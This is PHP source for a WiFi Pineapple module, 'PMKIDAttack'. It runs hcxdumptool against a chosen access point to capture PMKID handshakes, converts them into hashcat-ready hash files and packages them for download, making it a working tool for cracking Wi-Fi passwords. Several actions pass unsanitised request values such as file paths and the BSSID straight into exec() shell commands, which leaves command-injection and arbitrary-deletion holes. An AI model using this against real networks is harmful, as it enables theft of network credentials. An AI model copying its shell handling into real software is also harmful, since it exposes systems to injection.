<?php

namespace pineapple;

require_once("/pineapple/modules/PineAP/api/PineAPHelper.php");

class PMKIDAttack extends Module
{
    const MODULE_PATH = "/pineapple/modules/PMKIDAttack";
    const MODULE_SD_PATH = "/sd/modules/PMKIDAttack";
    const TOOLS_PATH = "/sbin/";
    const TOOLS_SD_PATH = "/sd/sbin/";

    private $pineAPHelper;
    private $modulePath;
    private $logPath;
    private $hcxdumptoolPath;
    private $hcxpcaptoolPath;

    public function __construct($request, $moduleClass)
    {
        parent::__construct($request, $moduleClass);

        $this->pineAPHelper = new PineAPHelper();
        $this->modulePath = $this->getPathModule();
        $this->logPath = $this->getPathModule() . "/log/module.log";
        $this->hcxdumptoolPath = $this->getToolPath("hcxdumptool");
        $this->hcxpcaptoolPath = $this->getToolPath("hcxpcaptool"); // old name hcxpcaptool
    }

    public function route()
    {
        switch ($this->request->action) {
            case "clearLog":
                $this->clearLog();
                break;
            case "getLog":
                $this->getLog();
                break;
            case "getDependenciesStatus":
                $this->getDependenciesStatus();
                break;
            case "managerDependencies":
                $this->managerDependencies();
                break;
            case "getDependenciesInstallStatus":
                $this->getDependenciesInstallStatus();
                break;
            case "startAttack":
                $this->startAttack();
                break;
            case "stopAttack":
                $this->stopAttack();
                break;
            case "catchPMKID":
                $this->catchPMKID();
                break;
            case "getPMKIDFiles":
                $this->getPMKIDFiles();
                break;
            case "downloadPMKID":
                $this->downloadPMKID();
                break;
            case "deletePMKID":
                $this->deletePMKID();
                break;
            case "getOutput":
                $this->getOutput();
                break;
            case "getStatusAttack":
                $this->getStatusAttack();
                break;
        }
    }

    protected function getPathModule()
    {
        if ($this->isSDAvailable()) {
            return self::MODULE_SD_PATH;
        }

        return self::MODULE_PATH;
    }

    protected function getToolPath($tool)
    {
        if ($this->isSDAvailable()) {
            return self::TOOLS_SD_PATH . $tool;
        }

        return self::TOOLS_PATH . $tool;
    }

    protected function clearLog()
    {
        exec("rm {$this->logPath}");
    }

    protected function getLog()
    {
        if (!file_exists($this->logPath)) {
            touch($this->logPath);
        }

        $this->response = array("pmkidlog" => file_get_contents($this->logPath));
    }

    protected function addLog($massage)
    {
        file_put_contents($this->logPath, $this->formatLog($massage), FILE_APPEND);
    }

    protected function formatLog($massage)
    {
        return "[" . date("Y-m-d H:i:s") . "] " . $massage . PHP_EOL;
    }

    protected function getDependenciesStatus()
    {
        $response = array(
            "installed" => false,
            "install" => "Install",
            "installLabel" => "success",
            "processing" => false
        );

        if (file_exists("/tmp/PMKIDAttack.progress")) {
            $response["install"] = "Installing...";
            $response["installLabel"] = "warning";
            $response["processing"] = true;
        } else if ($this->checkDependencyInstalled()) {
            $response["install"] = "Remove";
            $response["installLabel"] = "danger";
            $response["installed"] = true;
        }

        $this->response = $response;
    }

    protected function checkDependencyInstalled()
    {      
        if ($this->uciGet("pmkidattack.@config[0].installed")) {
            return true; 
        }

        if ($this->checkDependency("hcxdumptool")) {
            $this->uciSet("pmkidattack.@config[0].installed", "1");
            return true; 
        }

        return false;
    }

    protected function managerDependencies()
    {
        $this->stopAttack();
        $action = $this->checkDependencyInstalled() ? "remove" : "install";
        $this->execBackground("{$this->modulePath}/scripts/dependencies.sh {$action}");
        $this->response = array("success" => true);
    }

    protected function getDependenciesInstallStatus()
    {
        $this->response = array("success" => !file_exists("/tmp/PMKIDAttack.progress"));
    }

    protected function startAttack()
    {
        $this->pineAPHelper->disablePineAP();

        //$this->execBackground("{$this->modulePath}/scripts/PMKIDAttack.sh start " . $this->request->bssid);
        $this->uciSet("pmkidattack.@config[0].bssid", $this->request->bssid);
        $this->uciSet("pmkidattack.@config[0].attack", "1");

        $BSSID = $this->getFormatBSSID();
        exec("echo {$BSSID} > {$this->modulePath}/scripts/filter.txt");
        $this->execBackground(
            "{$this->hcxdumptoolPath} " . 
            "-o /tmp/{$BSSID}.pcapng " .
            "-i wlan1mon " .
            "--filterlist_ap={$this->modulePath}/scripts/filter.txt " .
            "--filtermode=2 " .
            "--enable_status=1 &> /dev/null &"
        );

        $this->addLog("Start attack " . $this->getBSSID());
        $this->response = array("success" => true);
    }

    protected function stopAttack()
    {
        $BSSID = $this->getFormatBSSID();

        //$this->execBackground("{$this->modulePath}/scripts/PMKIDAttack.sh stop");
        exec("/usr/bin/pkill hcxdumptool");
        if ($this->checkPMKID()) {
            exec("cp /tmp/{$BSSID}.pcapng {$this->modulePath}/pcapng/");
        }
        exec("rm /tmp/{$BSSID}.pcapng /tmp/pmkid-output.txt");

        $this->uciSet("pmkidattack.@config[0].bssid", "");
        $this->uciSet("pmkidattack.@config[0].attack", "0");
        $this->addLog("Stop attack " . $this->getBSSID());

        $this->response = array("success" => true);
    }


    protected function catchPMKID()
    {
        $status = $this->checkPMKID();
        if ($status) {
            $this->addLog("PMKID " . $this->getBSSID() . " intercepted!");
        }

        $this->response = array(
            "success" => $status,
            "output" => file_get_contents("/tmp/pmkid-output.txt"),
        );
    }

    protected function getFormatBSSID()
    {
        $bssid = $this->uciGet("pmkidattack.@config[0].bssid");      

        return str_replace(":", "", $bssid);
    }

    protected function getBSSID()
    {
        return $this->uciGet("pmkidattack.@config[0].bssid");
    }

    protected function checkPMKID()
    {
        $BSSID = $this->getFormatBSSID();

        // hcxpcaptool 6.0   : -z <file> : output PMKID file (hashcat hashmode -m 16800 old format and john)
        // hcxpcapngtool 6.1 : -o <file> : output WPA-PBKDF2-PMKID+EAPOL (hashcat -m 22000)hash file
        //exec("{$this->modulePath}/scripts/PMKIDAttack.sh check-bg " . $this->getFormatBSSID());
        exec("{$this->hcxpcaptoolPath} -o /tmp/pmkid-handshake.tmp /tmp/{$BSSID}.pcapng &> /tmp/pmkid-output.txt");
        $file = file_get_contents("/tmp/pmkid-output.txt");
        exec("rm /tmp/pmkid-handshake.tmp");

        // tested on hcxpcaptool 6.0
        return (strpos($file, " handshake(s) written to") !== false && strpos($file, "0 handshake(s) written to") === false);
    }

    protected function getPMKIDFiles()
    {
        $pmkids = [];
        foreach (glob("{$this->modulePath}/pcapng/*.pcapng") as $file) {
            $pmkids[] = [
                "path" => $file,
                "name" => implode(str_split(basename($file, ".pcapng"), 2), ":")
            ];
        }

        $this->response = array("pmkids" => $pmkids);
    }

    protected function downloadPMKID()
    {
        $file = $this->request->file;
        $fileName = basename($this->request->file, ".pcapng");

        exec("mkdir /tmp/PMKIDAttack/");
        exec("cp {$file} /tmp/PMKIDAttack/");
        exec("{$this->hcxpcaptoolPath} -o /tmp/PMKIDAttack/pmkid.22000 {$file} &> /tmp/PMKIDAttack/pmkid-download-output.txt");
        exec("cd /tmp/PMKIDAttack/ && tar -czf /tmp/{$fileName}.tar.gz *");
        exec("rm -rf /tmp/PMKIDAttack/");

        $this->response = array("download" => $this->downloadFile("/tmp/{$fileName}.tar.gz"));
    }

    protected function deletePMKID()
    {
        exec("rm {$this->request->file}");
    }

    protected function getOutput()
    {
        if (!empty($this->request->pathPMKID)) {
            exec("{$this->hcxpcaptoolPath} -o /tmp/pmkid-handshake.tmp {$this->request->pathPMKID} &> /tmp/pmkid-old-output.txt");
            $output = file_get_contents("/tmp/pmkid-old-output.txt");
            exec("rm /tmp/pmkid-old-output.txt");
        } else {
            $output = file_get_contents("/tmp/pmkid-output.txt");
        }

        $this->response = array("output" => $output);
    }

    protected function getStatusAttack()
    {
        $this->response = array(
            "bssid" => $this->uciGet("pmkidattack.@config[0].bssid"),
            "success" => $this->uciGet("pmkidattack.@config[0].attack") === true,
        );
    }
}
